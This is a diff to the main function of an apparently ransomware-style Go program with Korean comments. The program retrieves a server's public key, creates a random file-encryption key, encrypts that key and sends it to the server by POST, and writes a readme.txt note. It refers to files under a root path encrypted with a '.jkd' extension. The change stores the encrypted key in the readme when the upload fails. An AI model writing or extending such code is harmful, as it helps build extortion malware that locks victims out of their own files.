@@ -41,7 +41,7 @@ func main() {
 	fmt.Println("PublicKey from server : ", *publicKey)
 
 	//난수 키 생성.
-	key := newClient.CreateRandomKey()
+	key, err := newClient.CreateRandomKey()
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -53,12 +53,12 @@ func main() {
 		log.Fatalln(err)
 	}
 
-	//공개키로 난수 키를 암호화 후 서버로 전달.
+	//공개키로 난수 키를 암호화.
 	cipherText, err := encrypt.EncryptRandomKeyWithPublicKey(key, publicKey)
 	if err != nil {
 		log.Fatalln(err)
 	}
-	fmt.Println("cipherText:", cipherText)
+	//fmt.Println("cipherText:", cipherText)
 
 	// readme.txt 생성 및 작성.
 	err = readme.CreateFileReadme("./readme.txt", readmeText)
@@ -71,6 +71,10 @@ func main() {
 	err = client.SendCipherWithPOST(cipherText)
 	if err != nil {
 		//todo 공개키로 암호화된 키를 로컬에 저장.
+		err = readme.OpenFileReadme("./readme.txt", string(cipherText))
+		if err != nil {
+			log.Println(err)
+		}
 	}
 
 	// rootPath의 하위 파일들을 복호화(확장자가.jkd으로 암호화된것만 복호화)
